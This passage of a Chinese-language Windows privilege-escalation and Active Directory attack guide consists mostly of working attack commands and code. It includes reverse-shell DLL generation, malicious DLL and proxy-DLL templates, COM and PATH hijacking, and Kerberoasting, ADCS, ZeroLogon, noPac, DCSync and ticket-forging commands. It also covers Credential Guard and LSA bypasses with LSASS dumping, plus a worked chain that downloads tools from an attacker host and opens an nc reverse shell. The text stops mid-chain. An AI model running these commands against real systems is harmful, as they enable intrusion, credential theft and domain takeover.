Phantom DLL 是应用程序引用的 DLL 文件，但实际在系统中不存在，可以放置恶意 DLL 替代。

**已知 Phantom DLL 列表：**

```cmd
# 常见 Phantom DLL
# wlbsctrl.dll
# wbemcomn.dll
# WindowsCodecs.dll
# version.dll
# dwmapi.dll
# propsys.dll
# uxtheme.dll
```

**利用：**

```bash
# 生成恶意 DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.10 LPORT=4444 -f dll -o wlbsctrl.dll

# 或使用自定义 DLL
# 编译一个 DLL 在 DllMain 中执行 payload
```

**C++ 恶意 DLL 模板：**

```cpp
#include <windows.h>

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            // 执行恶意代码
            system("net localgroup Administrators lowuser /add");
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}
```

### 10.3 路径劫持

**环境变量 PATH 劫持：**

```cmd
# 检查 PATH 中的可写目录
echo %PATH%
for %a in ("%path:;=" "%") do @icacls %~a 2>nul | findstr /i "BUILTIN\\Users.*(F) Everyone.*(F) BUILTIN\\Users.*(W) Everyone.*(W)"

# 如果 PATH 中有可写目录且排在系统目录之前
# 放置同名恶意文件
copy C:\Windows\Temp\payload.exe "C:\Python27\notepad.exe"
```

**PowerShell 检测：**

```powershell
$env:Path.Split(';') | ForEach-Object {
    $path = $_.Trim('"')
    if (Test-Path $path) {
        $acl = Get-Acl $path
        $writable = $acl.Access | Where-Object {
            $_.FileSystemRights -match "Write|FullControl|Modify" -and
            $_.IdentityReference -match "BUILTIN\\Users|Everyone"
        }
        if ($writable) {
            Write-Output "[!] Writable PATH entry: $path"
        }
    }
}
```

### 10.4 COM 劫持

**COM 对象劫持：**

```cmd
# 检查 COM 对象注册
reg query HKCR\CLSID

# 查找缺失的 COM 服务器 DLL
# 使用 ProcMon 监控 COM 对象加载
```

**PowerShell COM 劫持检测：**

```powershell
# 列出所有 COM 组件
Get-ChildItem "HKCR:\CLSID" | ForEach-Object {
    $clsid = $_.PSChildName
    $inprocPath = Get-ItemProperty "HKCR:\CLSID\$clsid\InProcServer32" -ErrorAction SilentlyContinue
    if ($inprocPath -and $inprocPath.'(default)') {
        $dllPath = $inprocPath.'(default)'
        if (-not (Test-Path $dllPath)) {
            Write-Output "[!] Missing COM DLL: $dllPath (CLSID: $clsid)"
        }
    }
}
```

**COM 劫持利用：**

```cmd
# 替换 COM 服务器 DLL
reg add "HKCR\CLSID\{CLSID}\InProcServer32" /v "" /t REG_SZ /d "C:\Windows\Temp\payload.dll" /f
reg add "HKCR\CLSID\{CLSID}\InProcServer32" /v "ThreadingModel" /t REG_SZ /d "Apartment" /f

# 触发 COM 对象
# 使用 PowerShell 或 VBScript
$com = New-Object -ComObject "Component.Name"
```

### 10.5 DLL 代理

**DLL 代理技术：**

代理 DLL 转发原始 DLL 的导出函数，同时在 DllMain 中执行恶意代码。

```cpp
// DLL 代理示例 - version.dll 代理
#pragma comment(linker, "/EXPORT:GetFileVersionInfoA=C:\\Windows\\System32\\version.GetFileVersionInfoA,@1")
#pragma comment(linker, "/EXPORT:GetFileVersionInfoByHandle=C:\\Windows\\System32\\version.GetFileVersionInfoByHandle,@2")
#pragma comment(linker, "/EXPORT:GetFileVersionInfoExA=C:\\Windows\\System32\\version.GetFileVersionInfoExA,@3")
#pragma comment(linker, "/EXPORT:GetFileVersionInfoExW=C:\\Windows\\System32\\version.GetFileVersionInfoExW,@4")
#pragma comment(linker, "/EXPORT:GetFileVersionInfoSizeA=C:\\Windows\\System32\\version.GetFileVersionInfoSizeA,@5")
#pragma comment(linker, "/EXPORT:GetFileVersionInfoSizeExA=C:\\Windows\\System32\\version.GetFileVersionInfoSizeExA,@6")
#pragma comment(linker, "/EXPORT:GetFileVersionInfoSizeExW=C:\\Windows\\System32\\version.GetFileVersionInfoSizeExW,@7")
#pragma comment(linker, "/EXPORT:GetFileVersionInfoSizeW=C:\\Windows\\System32\\version.GetFileVersionInfoSizeW,@8")
#pragma comment(linker, "/EXPORT:GetFileVersionInfoW=C:\\Windows\\System32\\version.GetFileVersionInfoW,@9")
#pragma comment(linker, "/EXPORT:VerFindFileA=C:\\Windows\\System32\\version.VerFindFileA,@10")
#pragma comment(linker, "/EXPORT:VerFindFileW=C:\\Windows\\System32\\version.VerFindFileW,@11")
#pragma comment(linker, "/EXPORT:VerInstallFileA=C:\\Windows\\System32\\version.VerInstallFileA,@12")
#pragma comment(linker, "/EXPORT:VerInstallFileW=C:\\Windows\\System32\\version.VerInstallFileW,@13")
#pragma comment(linker, "/EXPORT:VerLanguageNameA=C:\\Windows\\System32\\version.VerLanguageNameA,@14")
#pragma comment(linker, "/EXPORT:VerLanguageNameW=C:\\Windows\\System32\\version.VerLanguageNameW,@15")
#pragma comment(linker, "/EXPORT:VerQueryValueA=C:\\Windows\\System32\\version.VerQueryValueA,@16")
#pragma comment(linker, "/EXPORT:VerQueryValueW=C:\\Windows\\System32\\version.VerQueryValueW,@17")

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        WinExec("cmd.exe /c net localgroup Administrators lowuser /add", SW_HIDE);
    }
    return TRUE;
}
```

---

## 11. 域环境提权

### 11.1 Kerberoasting

Kerberoasting 攻击利用 Kerberos 服务票据 (TGS) 中的加密部分，离线破解服务账户密码。

**检测与执行：**

```powershell
# 使用 PowerView 查找 SPN 账户
Import-Module .\PowerView.ps1
Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname

# 使用 Impacket 执行 Kerberoasting
python GetUserSPNs.py domain.local/user:password -request -outputfile hashes.txt
python GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.10 -request

# 使用 Rubeus
Rubeus.exe kerberoast /outfile:hashes.txt
Rubeus.exe kerberoast /domain:domain.local /creduser:domain\user /credpassword:password /outfile:hashes.txt

# 使用 Mimikatz
mimikatz.exe "privilege::debug" "kerberos::list /export" exit
```

**破解 Kerberoast 哈希：**

```bash
# 使用 hashcat 破解
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt --force

# 使用 john
john --format=krb5tgs hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

### 11.2 AS-REP Roasting

AS-REP Roasting 攻击不需要 Kerberos 预认证的账户。

**检测与执行：**

```powershell
# 使用 PowerView 查找不需要预认证的账户
Get-DomainUser -PreauthNotRequired

# 使用 Rubeus
Rubeus.exe asreproast /user:targetuser /domain:domain.local /outfile:hashes.txt
Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt

# 使用 Impacket
python GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat -outputfile hashes.txt
python GetNPUsers.py domain.local/user -no-pass -dc-ip 10.10.10.10
```

**破解 AS-REP 哈希：**

```bash
hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

### 11.3 ACL 滥用

**检测 ACL 权限：**

```powershell
# 使用 BloodHound / SharpHound
SharpHound.exe -c All -d domain.local --zipfilename bloodhound.zip

# 使用 PowerView
Find-InterestingDomainAcl -ResolveGUIDs
Get-DomainObjectAcl -Identity "targetuser" -ResolveGUIDs

# 检查特定权限
Get-ObjectAcl -SamAccountName "targetuser" -ResolveGUIDs | Where-Object {
    $_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteDacl|WriteOwner|WriteProperty"
}
```

**利用 ACL 权限：**

```powershell
# GenericAll / GenericWrite: 强制重置密码
Set-DomainUserPassword -Identity "targetuser" -AccountPassword (ConvertTo-SecureString "NewPassword123!" -AsPlainText -Force)

# WriteDacl: 授予 DCSync 权限
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity "attacker" -Rights DCSync

# WriteOwner: 获取所有权
Set-DomainObjectOwner -Identity "targetgroup" -OwnerIdentity "attacker"

# AddMember: 添加到组
Add-DomainGroupMember -Identity "Domain Admins" -Members "attacker"
```

### 11.4 ADCS 证书攻击 (ESC1-ESC8)

**ADCS 环境检测：**

```cmd
# 检测 ADCS 服务器
certutil -config - -ping
certutil -TCAInfo

# 使用 Certify
Certify.exe find /vulnerable
Certify.exe find /ca:CA-SERVER.domain.local\CA-NAME
```

**ESC1 - 模板允许请求者指定 SAN：**

```cmd
# 使用 Certify 请求证书
Certify.exe request /ca:CA-SERVER.domain.local\CA-NAME /template:VulnerableTemplate /altname:Administrator

# 使用证书请求 Kerberos 票据
Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /password:password /ptt
```

**ESC2 - 模板可用于任何目的：**

```cmd
Certify.exe request /ca:CA-SERVER.domain.local\CA-NAME /template:VulnerableTemplate2 /altname:DomainAdmin
```

**ESC3 - 注册代理模板：**

```cmd
# 请求注册代理证书
Certify.exe request /ca:CA-SERVER.domain.local\CA-NAME /template:EnrollmentAgent

# 使用注册代理代表其他用户请求证书
Certify.exe request /ca:CA-SERVER.domain.local\CA-NAME /template:User /onbehalfof:DOMAIN\Administrator /enrollcert:enrollmentagent.pfx
```

**ESC4 - 模板访问控制：**

```cmd
# 如果对模板有写权限，修改模板配置
# 启用 SAN 或降低安全要求
```

**ESC8 - NTLM 中继到 ADCS Web 注册：**

```bash
# 使用 Certipy
certipy relay -ca 10.10.10.10 -template DomainController

# 使用 PetitPotam 触发认证
python3 PetitPotam.py -d domain.local -u user -p password 10.10.14.10 10.10.10.10
```

### 11.5 PrintNightmare (CVE-2021-34527)

**影响版本：** Windows Server 2012/2016/2019/2022

```bash
# 使用 Impacket 利用
python3 CVE-2021-34527.py domain.local/user:password@10.10.10.10 '\\10.10.14.10\share\payload.dll'

# 使用 Mimikatz
mimikatz.exe "privilege::debug" "misc::printnightmare /server:10.10.10.10 /library:\\10.10.14.10\share\payload.dll" exit

# 本地提权
mimikatz.exe "privilege::debug" "misc::printnightmare /library:C:\Windows\Temp\payload.dll" exit
```

### 11.6 ZeroLogon (CVE-2020-1472)

**影响版本：** Windows Server 2008 R2 - 2019

```bash
# 检测
python3 zerologon_tester.py DC-NAME 10.10.10.10

# 利用
python3 cve-2020-1472-exploit.py DC-NAME 10.10.10.10

# 重置计算机账户密码为空
# 使用空密码 DCSync
impacket-secretsdump -just-dc domain.local/DC-NAME\$@10.10.10.10 -no-pass

# 恢复密码（重要！）
python3 restorepassword.py domain.local/DC-NAME@DC-NAME -target-ip 10.10.10.10 -hexpass <original_hex_password>
```

### 11.7 SamAccountName Spoofing (CVE-2021-42278 / CVE-2021-42287)

**影响版本：** Windows Server 2012 R2 - 2022

```bash
# 使用 noPac 利用
python3 noPac.py domain.local/user:password -dc-ip 10.10.10.10 -shell
python3 noPac.py domain.local/user:password -dc-ip 10.10.10.10 -dump -just-dc-user administrator

# 或使用 sAMAccountName spoofing
# 1. 创建机器账户
# 2. 清除机器账户的 SPN
# 3. 重命名机器账户为 DC 名称（不含 $）
# 4. 请求 TGT
# 5. 恢复机器账户名
# 6. 使用 TGT 请求服务票据
```

### 11.8 DCSync 攻击

```bash
# 使用 Mimikatz (需要 Replication-Get-Changes-All 权限)
mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:domain.local /all" exit
mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:domain.local /user:krbtgt" exit

# 使用 Impacket
impacket-secretsdump domain.local/user:password@10.10.10.10 -just-dc-user administrator
```

### 11.9 Kerberos 票据攻击

**Golden Ticket：**

```cmd
# 需要 krbtgt 哈希
mimikatz.exe "privilege::debug" "kerberos::golden /domain:domain.local /sid:S-1-5-21-XXX /krbtgt:<hash> /user:Administrator /id:500 /ptt" exit

# 使用 Rubeus
Rubeus.exe golden /domain:domain.local /sid:S-1-5-21-XXX /rc4:<krbtgt_hash> /user:Administrator /id:500 /ptt
```

**Silver Ticket：**

```cmd
# 需要服务账户的 NTLM 哈希
mimikatz.exe "privilege::debug" "kerberos::golden /domain:domain.local /sid:S-1-5-21-XXX /target:server.domain.local /service:cifs /rc4:<service_hash> /user:Administrator /ptt" exit

# 使用 Rubeus
Rubeus.exe silver /domain:domain.local /sid:S-1-5-21-XXX /target:server.domain.local /service:cifs /rc4:<service_hash> /user:Administrator /ptt
```

**Diamond Ticket：**

```cmd
# 使用 Rubeus
Rubeus.exe diamond /domain:domain.local /user:Administrator /password:password /dc:dc.domain.local /enctype:AES256 /krbkey:<aes256_key> /ticketuser:Administrator /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

### 11.10 NTLM 中继攻击

```bash
# 使用 Responder 捕获 NTLM 哈希
python3 Responder.py -I eth0 -wrf

# 使用 ntlmrelayx 中继
python3 ntlmrelayx.py -tf targets.txt -smb2support
python3 ntlmrelayx.py -tf targets.txt -smb2support -c "powershell -enc ..."
python3 ntlmrelayx.py -tf targets.txt -smb2support -i  # 交互式 shell

# 使用 PetitPotam / PrinterBug 触发认证
python3 PetitPotam.py -d domain.local -u user -p password 10.10.14.10 10.10.10.10
python3 printerbug.py domain.local/user:password@10.10.14.10 10.10.10.10

# 使用 DFSCoerce 触发认证
python3 dfscoerce.py -d domain.local -u user -p password 10.10.14.10 10.10.10.10
```

---

## 12. 2026 最新技术

### 12.1 Windows 11 24H2 提权

**Windows 11 24H2 新安全特性：**

- **VBS Enclave 增强**：更严格的基于虚拟化的安全隔离
- **Rust 内核组件**：内存安全改进
- **Smart App Control 2.0**：AI 驱动的应用程序控制
- **Pluton 安全处理器集成**：硬件级安全
- **Credential Guard 默认启用**：企业版默认开启

**2026 年针对 Windows 11 24H2 的提权技术：**

```powershell
# 检测 Windows 11 24H2 版本
[System.Environment]::OSVersion.Version
(Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion").DisplayVersion
(Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion").CurrentBuild

# 检测 VBS 状态
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard
# 或
msinfo32.exe | findstr "Virtualization-based security"

# 检测 Credential Guard 状态
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard | Select-Object SecurityServicesRunning
```

**Windows 11 24H2 可用的提权方法：**

```cmd
# 1. 令牌窃取（如果 SeImpersonatePrivilege 可用）
# 使用 GodPotato 2.0（针对 24H2 优化）
GodPotato.exe -cmd "cmd /c whoami"

# 2. 服务权限滥用（经典方法仍然有效）
# 检查服务权限
accesschk.exe -uwcqv "Authenticated Users" *

# 3. UAC 绕过（fnhelper 替代品）
# Windows 11 24H2 修补了 fodhelper 绕过，使用新的注册表路径
reg add "HKCU\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command" /d "C:\Windows\Temp\payload.exe" /f

# 4. 内核漏洞（2026 年最新 CVE）
# 使用 Watson 检测
Watson.exe
```

### 12.2 Credential Guard 绕过

**Credential Guard 检测：**

```cmd
# 检查 Credential Guard 状态
reg query HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard /v EnableVirtualizationBasedSecurity
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v LsaCfgFlags

# LsaCfgFlags 值:
# 0 = 禁用
# 1 = 启用但未锁定 UEFI
# 2 = 启用并锁定 UEFI
```

**Credential Guard 绕过技术：**

```powershell
# 方法1: 使用 WDigest 降级
# 如果 LsaCfgFlags = 1 (未锁定)
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v LsaCfgFlags /t REG_DWORD /d 0 /f
# 需要重启

# 方法2: 使用 PPLdump 绕过 LSA 保护
PPLdump.exe lsass.exe C:\Windows\Temp\lsass.dmp

# 方法3: 使用内存修补
# 修补 LSASS 进程内存中的 Credential Guard 钩子

# 方法4: 使用 SSDT 钩子绕过
# 需要内核级访问

# 方法5: 使用 WDigest 启用明文密码
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
```

**绕过 Credential Guard 提取凭据：**

```cmd
# 使用 Nanodump (支持 Credential Guard)
nanodump.exe --write C:\Windows\Temp\lsass.dmp

# 使用 Pypykatz 读取转储
pypykatz lsa minidump lsass.dmp

# 使用 HandleKatz
HandleKatz.exe --pid <lsass_pid>
```

### 12.3 VBS 降级

**VBS (Virtualization-Based Security) 降级攻击：**

```powershell
# 检测 VBS 状态
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard

# 检查 HVCI 状态
(Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity").Enabled

# VBS 降级方法（需要管理员权限）
# 1. 通过 BCDEdit 禁用
bcdedit /set hypervisorlaunchtype off
# 需要重启

# 2. 通过组策略
# 计算机配置 -> 管理模板 -> 系统 -> Device Guard -> 打开基于虚拟化的安全性 -> 禁用

# 3. 通过注册表
reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard" /v EnableVirtualizationBasedSecurity /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v LsaCfgFlags /t REG_DWORD /d 0 /f
```

### 12.4 LSA 保护绕过

**LSA 保护 (RunAsPPL) 检测：**

```cmd
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL
```

**绕过 LSA 保护：**

```cmd
# 使用 PPLdump
PPLdump.exe lsass.exe C:\Windows\Temp\lsass.dmp

# 使用 PPLcontrol
PPLcontrol.exe /disablePPL

# 使用 Mimikatz 驱动
mimikatz.exe "privilege::debug" "!+" "!processprotect /process:lsass.exe /remove" exit

# 使用 PPLKiller
PPLKiller.exe /pid:<lsass_pid> /dump:C:\Windows\Temp\lsass.dmp
```

**mimikatz 驱动加载绕过 PPL：**

```cmd
# 加载 mimikatz 驱动
mimikatz.exe "privilege::debug" "!+" "!processprotect /process:lsass.exe /remove" "sekurlsa::logonpasswords" exit
```

### 12.5 Windows Recall 功能提权

**Windows Recall (AI 功能) 利用：**

Recall 是 Windows 11 24H2 引入的 AI 快照功能，每隔几秒截取屏幕并存储可搜索的数据库。

```powershell
# 检测 Recall 是否启用
Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Recall" -ErrorAction SilentlyContinue

# Recall 数据位置
# C:\Users\<user>\AppData\Local\CoreAIPlatform.00\UKP\{GUID}\
# 包含 SQLite 数据库和屏幕截图

# 提取 Recall 数据
# 使用 TotalRecall 工具
TotalRecall.exe --path "C:\Users\user\AppData\Local\CoreAIPlatform.00\UKP"

# 搜索 Recall 数据库中的凭据
# 屏幕截图中可能包含密码、API 密钥等敏感信息
```

**Recall 提权链：**

```cmd
# 1. 获得低权限访问
# 2. 搜索 Recall 数据库中的管理员凭据截图
# 3. 提取明文密码
# 4. 使用 RunAs 或令牌窃取提权
runas /user:Administrator cmd.exe
```

### 12.6 2026 年新工具与技术

**Nanodump (新一代 LSASS 转储)：**

```cmd
# 支持 Credential Guard 和 PPL 绕过
nanodump.exe --write C:\Windows\Temp\lsass.dmp
nanodump.exe --write C:\Windows\Temp\lsass.dmp --ssp
nanodump.exe --write C:\Windows\Temp\lsass.dmp --valid

# 远程转储
nanodump.exe --write C:\Windows\Temp\lsass.dmp --remote 10.10.10.10
```

**BypassUAC 2026 方法：**

```cmd
# 2026 年最新的 UAC 绕过方法
# 使用 Windows 11 24H2 新引入的组件

# 方法1: 利用新的 MSI 安装程序路径
# 方法2: 利用 Windows Copilot 的 COM 组件
# 方法3: 利用 Windows Sandbox 的进程创建机制
```

**AI 驱动的提权：**

```powershell
# 使用 AI 分析系统配置
# 自动识别提权路径
# 结合 BloodHound + LLM 路径分析

# 示例: AI 分析 PowerShell 输出
$systemInfo = systeminfo
# 将输出发送到 AI 模型分析
# 识别缺失的补丁和配置问题
```

**Windows Sandbox 逃逸：**

```cmd
# Windows Sandbox 提权
# 利用 Sandbox 与主机之间的共享剪贴板/文件
# 使用 GPU 虚拟化漏洞
# 利用 Hyper-V 隔离逃逸
```

---

## 13. 自动化提权工具链

### 13.1 WinPEAS

```cmd
# 全面扫描
WinPEASx64.exe
WinPEASx86.exe

# 特定检查
WinPEASx64.exe systeminfo
WinPEASx64.exe userinfo
WinPEASx64.exe servicesinfo
WinPEASx64.exe applicationsinfo
WinPEASx64.exe networkinfo
WinPEASx64.exe processinfo

# 输出到文件
WinPEASx64.exe > C:\Windows\Temp\winpeas_output.txt
WinPEASx64.exe log=C:\Windows\Temp\winpeas.txt
```

**WinPEAS 检测项：**
- 系统信息与补丁
- 用户权限与组
- 服务与计划任务
- 注册表配置
- 网络配置
- 凭据文件
- 应用程序漏洞

### 13.2 Seatbelt

```cmd
# 全面扫描
Seatbelt.exe -group=all
Seatbelt.exe -group=all -full

# 特定检查
Seatbelt.exe -group=system
Seatbelt.exe -group=user
Seatbelt.exe -group=network
Seatbelt.exe -group=process
Seatbelt.exe -group=misc

# 单个检查
Seatbelt.exe OSInfo
Seatbelt.exe UACSystemPolicies
Seatbelt.exe TokenPrivileges
Seatbelt.exe InterestingFiles
Seatbelt.exe ChromiumPresence
Seatbelt.exe WindowsCredentialFiles
Seatbelt.exe RDPSessions
Seatbelt.exe ExplicitLogonEvents
Seatbelt.exe LogonSessions
Seatbelt.exe LSASettings
Seatbelt.exe NTLMSettings
Seatbelt.exe LocalGroupMembers
Seatbelt.exe ScheduledTasks
Seatbelt.exe Services
Seatbelt.exe NonstandardServices
Seatbelt.exe AuditPolicies
Seatbelt.exe WMIEventConsumer
Seatbelt.exe WMIEventFilter
Seatbelt.exe WMIFilterBinding
Seatbelt.exe RegistryAutoRuns
Seatbelt.exe RegistryAutoLogon
Seatbelt.exe AlwaysInstallElevated
Seatbelt.exe InternetSettings
Seatbelt.exe PuttySessions
Seatbelt.exe PuttyHostKeys
Seatbelt.exe CloudCredentials
Seatbelt.exe WindowsVault
Seatbelt.exe PowerShellHistory
Seatbelt.exe IEFavorites
Seatbelt.exe FileZilla
Seatbelt.exe RecentRunCommands
Seatbelt.exe Sysmon
Seatbelt.exe AMSIProviders
Seatbelt.exe AntiVirus
Seatbelt.exe AppLocker
Seatbelt.exe NamedPipes
Seatbelt.exe DNSCache
Seatbelt.exe ARPTable
Seatbelt.exe AllTcpConnections
Seatbelt.exe AllUdpConnections
Seatbelt.exe NetworkShares
Seatbelt.exe MappedDrives
Seatbelt.exe WindowsFirewall
Seatbelt.exe EnvironmentPath
Seatbelt.exe Hotfixes
Seatbelt.exe InstalledProducts
Seatbelt.exe LastShutdown
Seatbelt.exe RecycleBin
Seatbelt.exe UserRightAssignments
Seatbelt.exe CredentialGuard
Seatbelt.exe DeviceGuard
Seatbelt.exe DotNet
Seatbelt.exe ProcessCreationEvents
Seatbelt.exe PowerShellEvents
Seatbelt.exe RegistryEvents
Seatbelt.exe WMIEvents
Seatbelt.exe IdleTime
Seatbelt.exe LocalUsers
Seatbelt.exe LogonEvents
Seatbelt.exe KerberosTickets
Seatbelt.exe ProcessOwners
Seatbelt.exe RunningProcesses
Seatbelt.exe TokenGroups
```

### 13.3 SharpUp

```cmd
# SharpUp 检查
SharpUp.exe audit
SharpUp.exe audit ModifiableServices
SharpUp.exe audit UnquotedServicePath
SharpUp.exe audit ModifiableServiceRegistry
SharpUp.exe audit ModifiableScheduledTasks
SharpUp.exe audit AlwaysInstallElevated
SharpUp.exe audit ModifiableAutoRuns
SharpUp.exe audit ServicePermissions
SharpUp.exe audit HijackablePaths
SharpUp.exe audit CachedGPPPassword
SharpUp.exe audit McAfeeSitelistFiles
SharpUp.exe audit ModifiableAppPaths
SharpUp.exe audit ModifiableConfigPaths
SharpUp.exe audit PathsWithNoOwner
```

### 13.4 PrivescCheck

```powershell
# 导入并运行
Import-Module .\PrivescCheck.ps1
Invoke-PrivescCheck

# 扩展检查
Invoke-PrivescCheck -Extended

# 输出到文件
Invoke-PrivescCheck -Report privesc_report
Invoke-PrivescCheck -Extended -Report privesc_full_report

# 特定检查
Invoke-PrivescCheck -Extended -Audit Services
Invoke-PrivescCheck -Extended -Audit Registry
Invoke-PrivescCheck -Extended -Audit Tasks
```

### 13.5 PowerUp.ps1

```powershell
Import-Module .\PowerUp.ps1

# 全面检查
Invoke-AllChecks

# 特定检查
Get-ModifiableService
Get-ModifiableServiceFile
Get-ServiceUnquoted
Get-ModifiableRegistryAutoRun
Get-ModifiableScheduledTaskFile
Get-UnattendedInstallFile
Get-Webconfig
Get-ApplicationHost
Get-RegistryAlwaysInstallElevated
Get-ServiceDetail -ServiceName "VulnerableService"
```

### 13.6 Sherlock

```powershell
Import-Module .\Sherlock.ps1

# 检测所有已知漏洞
Find-AllVulns

# 检测特定漏洞
Find-MS16032
Find-MS17010
Find-CVE20200787
Find-CVE20211732
Find-CVE202221882
```

### 13.7 Watson

```cmd
# 补丁级别检测
Watson.exe

# 输出详细版本信息
Watson.exe -v

# 输出 JSON 格式
Watson.exe -j > watson_output.json
```

### 13.8 自动化提权脚本

**综合提权脚本模板：**

```powershell
# Windows_PrivEsc_Check.ps1
# 自动化提权检查脚本

function Invoke-WindowsPrivEscCheck {
    Write-Output "[*] ===== Windows Privilege Escalation Check ====="
    Write-Output "[*] Hostname: $(hostname)"
    Write-Output "[*] OS: $(Get-CimInstance Win32_OperatingSystem | Select-Object -ExpandProperty Caption)"
    Write-Output "[*] Current User: $(whoami)"
    Write-Output "[*] Architecture: $env:PROCESSOR_ARCHITECTURE"
    
    Write-Output "`n[+] ===== User Privileges ====="
    whoami /priv
    
    Write-Output "`n[+] ===== User Groups ====="
    whoami /groups
    
    Write-Output "`n[+] ===== Installed Hotfixes ====="
    Get-HotFix | Select-Object HotFixID, InstalledOn | Format-Table -AutoSize
    
    Write-Output "`n[+] ===== AlwaysInstallElevated ====="
    $hkcu = Get-ItemProperty "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue
    $hklm = Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue
    if ($hkcu.AlwaysInstallElevated -eq 1 -and $hklm.AlwaysInstallElevated -eq 1) {
        Write-Output "[!] ALERT: AlwaysInstallElevated is ENABLED!"
    } else {
        Write-Output "[-] Not enabled"
    }
    
    Write-Output "`n[+] ===== Unquoted Service Paths ====="
    Get-WmiObject Win32_Service | Where-Object {
        $_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'
    } | Format-Table Name, PathName, StartName -AutoSize
    
    Write-Output "`n[+] ===== Modifiable Services ====="
    # 使用 accesschk 或检查服务 ACL
    
    Write-Output "`n[+] ===== Non-Standard Services ====="
    Get-WmiObject Win32_Service | Where-Object {
        $_.PathName -notlike "*Windows*" -and $_.PathName -notlike "*system32*" -and $_.PathName -ne $null
    } | Format-Table Name, PathName, StartName, StartMode -AutoSize
    
    Write-Output "`n[+] ===== Stored Credentials ====="
    cmdkey /list
    
    Write-Output "`n[+] ===== Listening Ports ====="
    netstat -ano | findstr "LISTENING"
    
    Write-Output "`n[+] ===== AutoRuns ====="
    Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -ErrorAction SilentlyContinue
    Get-ItemProperty "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -ErrorAction SilentlyContinue
    
    Write-Output "`n[+] ===== PowerShell History ====="
    $historyPath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
    if (Test-Path $historyPath) {
        Get-Content $historyPath -Tail 20
    }
    
    Write-Output "`n[+] ===== Interesting Files ====="
    Get-ChildItem C:\ -Include *.kdbx,*.rdp,*.config,unattend.xml,sysprep.xml -Recurse -ErrorAction SilentlyContinue -Depth 3 |
        Select-Object FullName -First 20
    
    Write-Output "`n[*] ===== Check Complete ====="
}

Invoke-WindowsPrivEscCheck
```

---

## 14. 实战案例

### 14.1 完整提权链：Web服务器到域管理员

**场景：** 攻击者通过 Web 漏洞获得 IIS 服务账户 (IIS APPPOOL\DefaultAppPool) 的 Shell。

**步骤 1: 信息收集**

```cmd
whoami
whoami /priv
systeminfo
hostname
ipconfig /all
net user
net localgroup Administrators
```

**发现：**
- 当前用户: IIS APPPOOL\DefaultAppPool
- 特权: SeImpersonatePrivilege (已启用)
- 系统: Windows Server 2019
- 域成员: corp.local

**步骤 2: 令牌窃取提权到 SYSTEM**

```cmd
# 上传 PrintSpoofer
certutil -urlcache -split -f http://10.10.14.10/PrintSpoofer64.exe C:\Windows\Temp\ps.exe

# 执行令牌窃取
C:\Windows\Temp\ps.exe -i -c "cmd.exe /c whoami"
# 输出: nt authority\system

# 获得 SYSTEM Shell
C:\Windows\Temp\ps.exe -i -c "C:\Windows\Temp\nc.exe 10.10.14.10 4444 -e cmd.exe"
```

**步骤 3: 凭据提取**

```cmd
# 上传 mimikatz
certutil -urlcache -split -f http://10.10.14.10/mimikatz.exe C:\Windows\Temp\m.exe

# 提取凭据
C:\Windows\Temp\m.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# 发现域用户凭据: corp\svc_sql : P@ssw0rd2024!
```

**步骤 4: 域环境侦察**

```cmd
# 使用域用户凭据
net use \\dc01.corp.local\IPC$ /user:corp\svc_sql "P@ssw0rd2024!"

# 上传 SharpHound
certutil -urlcache -split -f http://10.10.14.10/SharpHound.exe C:\Windows\Temp\sh.exe

# 收集域信息
